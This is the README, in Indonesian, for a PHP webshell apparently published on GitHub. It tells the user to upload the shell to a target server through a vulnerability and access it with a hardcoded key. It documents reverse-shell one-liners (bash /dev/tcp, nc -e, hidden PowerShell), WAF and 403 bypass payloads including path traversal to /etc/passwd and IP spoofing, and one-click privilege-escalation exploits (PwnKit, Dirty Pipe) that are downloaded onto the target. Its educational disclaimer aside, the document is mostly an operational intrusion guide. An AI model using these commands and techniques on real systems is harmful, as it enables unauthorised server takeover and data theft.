# 🐍 SERPENTECHUNTER v2.1 – PHP WEBSHELL

**WebShell PHP untuk Security Testing & Penetration Testing**

![PHP](https://img.shields.io/badge/PHP-7.4%2B-blueviolet?style=flat-square&logo=php)
![Version](https://img.shields.io/badge/version-2.1-brightgreen?style=flat-square)
![Developer](https://img.shields.io/badge/Developer-SerpentSecHunter-orange?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-red?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-blue?style=flat-square)

---

## 📌 Tentang

**SERPENTECHUNTER v2.1** adalah WebShell PHP yang dirancang untuk **security testing** dan **penetration testing**. Shell ini memiliki fitur standar seperti **file manager**, **command execution**, **upload/download**, **reverse shell**, dan **exploit engine** untuk privilege escalation di Linux & Windows.

> ⚠️ **Disclaimer:** Tools ini hanya untuk tujuan edukasi dan pengujian keamanan yang sah (authorized penetration testing). Penggunaan untuk aktivitas ilegal adalah tanggung jawab pengguna sepenuhnya.

---

## 🔥 Fitur Utama

| Fitur | Deskripsi |
|-------|-----------|
| **🛡️ Stealth Engine** | Bypass 403/404 dengan spoofing header, User-Agent, Referer, IP |
| **🔐 Authentication** | Multi-layer auth (Cookie + GET Parameter + IP Whitelist) |
| **⚡ Command Execution** | 4 metode fallback (`shell_exec`, `exec`, `system`, `proc_open`) |
| **📁 File Manager** | List, Read, Write, Delete, Rename, Chmod, Search, Archive (ZIP), Extract |
| **📤 Upload & Download** | Upload via POST, Download local file, Remote Download via HTTP |
| **📋 Mass Actions** | Delete, Rename, Copy, Move multiple files sekaligus |
| **🌐 Reverse Shell** | 7 metode (Bash, Netcat, Python, PHP, Perl, Ruby, PowerShell) |
| **🔍 Port Scanner** | TCP Connect scanner dengan multi-format port support |
| **🗄️ Database Client** | Support MySQL, PostgreSQL, SQLite |
| **🔥 Exploit Engine** | PwnKit (CVE-2021-4034), Dirty Cow (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), PrintSpoofer |
| **🔍 Vulnerability Check** | Deteksi OS, kernel, dan privilege |
| **🎨 UI Responsive** | Tampilan blackhat theme, mobile-friendly, Toast Notification |

---

## 🛡️ Bypass 403/404

Shell ini memiliki beberapa teknik bypass sederhana:

| Teknik | Deskripsi |
|--------|-----------|
| **Path Traversal** | `?file=../../../../etc/passwd` |
| **Double URL Encoding** | `%252e%252e%252f` |
| **Null Byte Injection** | `%00` bypass ekstensi |
| **Case Manipulation** | `Index.Php` → `index.php` (IIS) |
| **HTTP Method Tampering** | `OPTIONS`, `TRACE`, `PUT`, `DELETE` |
| **Header Injection** | `X-Original-URL`, `X-Rewrite-URL` |
| **User-Agent Spoofing** | Googlebot |
| **IP Spoofing** | `X-Forwarded-For: 127.0.0.1` |

---

## 🔐 Authentication

| Metode | Deskripsi |
|--------|-----------|
| **Cookie** | `sc_auth` – bertahan 1 tahun |
| **GET Parameter** | `?auth=SERPENTECHUNTER666` |
| **IP Whitelist** | Support wildcard (`%`) dan CIDR (`/24`) |
| **Bypass IP** | `?bypass_ip=1` |

**Ubah AUTH_KEY:**
```php
$AUTH_KEY = 'YOUR_CUSTOM_KEY_HERE';
```

**Tambah IP Whitelist:**
```php
$IP_WHITELIST = ['127.0.0.1', '::1', '192.168.1.%', '10.0.0.0/8'];
```

---

## 🚀 Cara Penggunaan

### 1. Upload Shell
Upload file `Shell2.php` ke server target melalui vulnerability (File Upload, RCE, dll).

### 2. Akses & Login
```bash
http://target.com/path/Shell2.php?auth=SERPENTECHUNTER666
```

### 3. Parameter & Perintah

| Parameter | Fungsi | Contoh |
|-----------|--------|--------|
| `action=exec` | Execute command | `?action=exec&cmd=whoami` |
| `action=file` | File Manager | `?action=file&cmd=list&target=/tmp` |
| `action=reverse` | Reverse Shell | `?action=reverse&ip=1.2.3.4&port=4444` |
| `action=portscan` | Port Scanner | `?action=portscan&target=127.0.0.1&params[ports]=1-100` |
| `action=db` | Database Client | `?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test` |
| `action=file&cmd=search` | Search File | `?action=file&cmd=search&target=/var/www&params[pattern]=config` |
| `action=file&cmd=archive` | Create Archive | `?action=file&cmd=archive&target=/var/www&params[type]=zip` |
| `action=exploit_check` | Check Vulnerabilities | `?action=exploit_check` |
| `action=exploit_run` | Run Exploit | `?action=exploit_run&type=auto` |

### 4. Bypass IP Whitelist
```bash
?bypass_ip=1
```

---

## 📁 File Manager

| Aksi | Cara |
|------|------|
| **List Directory** | Otomatis tampil di panel kiri |
| **Edit File** | Klik ✏️ → edit → SAVE |
| **View File** | Klik 👁️ → lihat isi |
| **Delete Single** | Klik 🗑️ → confirm |
| **Delete Mass** | Checkbox → DELETE SELECTED |
| **Rename Single** | Klik 📝 → input new name |
| **Rename Mass** | Checkbox → RENAME → input new names |
| **Copy Mass** | Checkbox → COPY → input destination |
| **Move Mass** | Checkbox → MOVE → input destination |
| **Search** | Input pattern → 🔍 SEARCH |
| **Upload** | Pilih file → ⬆ UPLOAD |
| **Zip Folder** | Input folder & zipname → ZIP |
| **Unzip File** | Input file.zip & dest → UNZIP |

---

## 🔥 Exploit Engine

Shell ini memiliki fitur **Exploit Engine** untuk privilege escalation:

### Linux Exploits
| Exploit | CVE | Deskripsi |
|---------|-----|-----------|
| **PwnKit** | CVE-2021-4034 | Local Privilege Escalation via pkexec |
| **Dirty Cow** | CVE-2016-5195 | Race condition di kernel Linux (2.6.22 - 4.8.3) |
| **Dirty Pipe** | CVE-2022-0847 | Kernel exploit (5.8 - 5.16.11) |

### Windows Exploits
| Exploit | Deskripsi |
|---------|-----------|
| **PrintSpoofer** | Privilege escalation via SeImpersonatePrivilege |

**Cara Pakai:**
1. Klik **"🔍 CHECK VULN"** → deteksi OS, kernel, privilege
2. Pilih exploit di dropdown → **"🔥 RUN"**
3. Output muncul di panel kanan

> ⚠️ **Catatan:** Exploit membutuhkan koneksi internet untuk download script dari GitHub. Pastikan server target terhubung ke internet.

---

## 🌐 Reverse Shell

Support 7 metode dengan background execution:

| Metode | Command |
|--------|---------|
| **Bash** | `bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'` |
| **Netcat** | `nc -e /bin/bash $ip $port` |
| **Python** | `python -c 'import socket,subprocess,os;...'` |
| **PHP** | `php -r '$sock=fsockopen(...);exec(...);'` |
| **Perl** | `perl -e 'use Socket;...'` |
| **Ruby** | `ruby -rsocket -e '...'` |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."` |

**Cara Pakai:**
```
?action=reverse&ip=1.2.3.4&port=4444
```

---

## 📊 Kelebihan & Kekurangan

### ✅ Kelebihan

| No | Kelebihan |
|----|-----------|
| 1 | **Exploit Engine** – Privilege escalation langsung dari shell |
| 2 | **Mass Actions** – Delete, Rename, Copy, Move banyak file sekaligus |
| 3 | **Cross-platform** – Support Windows & Linux dengan deteksi otomatis |
| 4 | **UI Interaktif** – Toast notification, Select All, responsive design |
| 5 | **Multi-strategy Execution** – 4 metode fallback (`shell_exec`, `exec`, `system`, `proc_open`) |
| 6 | **File Manager Lengkap** – Edit, View, Delete, Rename, Copy, Move, Chmod, Search, Archive, Extract |

### ❌ Kekurangan

| No | Kekurangan |
|----|------------|
| 1 | **Tergantung PHP** – Hanya berjalan di server dengan PHP |
| 2 | **Membutuhkan `shell_exec` atau alternatif** – Jika semua fungsi eksekusi di-disable, shell tidak bisa jalan |
| 3 | **Exploit Engine butuh koneksi internet** – Untuk download exploit dari GitHub |
| 4 | **Rentan deteksi** – Meskipun ada stealth engine, shell tetap bisa terdeteksi oleh AV/EDR |
| 5 | **Tidak ada persistence** – Harus upload ulang jika server di-restart atau file dihapus |

---

## 📝 Changelog

### v2.1 (03-07-2026)
- ✅ Exploit Engine (PwnKit, Dirty Cow, Dirty Pipe, PrintSpoofer)
- ✅ OS Detection (Windows & Linux)
- ✅ Vulnerability Check (auto detect)
- ✅ One-Click Exploit Execution
- ✅ Mass Actions (Delete, Rename, Copy, Move)
- ✅ Select All / Deselect All
- ✅ Toast Notification
- ✅ UI Responsive

### v2.0 (02-07-2026)
- ✅ Bypass 403/404 (9 teknik)
- ✅ Bypass disable_functions (12 strategi)
- ✅ WAF Bypass (6 teknik)
- ✅ Auto-detect Server

### v1.1 (02-07-2026)
- ✅ Fix IP Wildcard support
- ✅ Fix LD_PRELOAD fallback
- ✅ Fix mod_cgi write error handling
- ✅ Fix Reverse Shell validation
- ✅ Fix Port Scanner multi-format support

### v1.0 (02-07-2026)
- Initial release

---

## ⚙️ Teknologi

- **PHP 7.4+**
- **HTML5 + CSS3** (Responsive UI)
- **JavaScript** (Toast notification, form interaksi)
- **Bash/Python/Perl/Ruby** (Reverse shell)
- **GCC** (Compile exploit)

---

## ⚖️ Lisensi

**MIT License** – Silakan gunakan, modifikasi, dan distribusikan dengan mencantumkan kredit kepada developer.

```
MIT License

Copyright (c) 2026 SerpentSecHunter

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

## 👨‍💻 Developer

**SerpentSecHunter**
- GitHub: [SerpentSecHunter2006](https://github.com/SerpentSecHunter2006)
- Rilis: 03-07-2026

---

## ⭐ Support

Jika Anda menyukai project ini, berikan **star** ⭐ di GitHub dan **fork** untuk mendukung pengembangan lebih lanjut!

---

## ⚠️ Disclaimer

> **Peringatan:** Tools ini dibuat untuk tujuan **edukasi** dan **pengujian keamanan** yang sah (authorized penetration testing). Penggunaan tools ini untuk aktivitas ilegal, hacking tanpa izin, atau merusak sistem orang lain adalah **TINDAKAN PIDANA** dan sepenuhnya menjadi **tanggung jawab pengguna**. Developer tidak bertanggung jawab atas penyalahgunaan tools ini.

---

**🐍 SERPENTECHUNTER v2.1 – "TIDAK ADA YANG GAK BISA!"** 😈

---

## 🔗 Repository Lain

- [WEB-SHELL-ASP](https://github.com/SerpentSecHunter2006/WEB-SHELL-ASP-) – ASP version untuk Windows/IIS
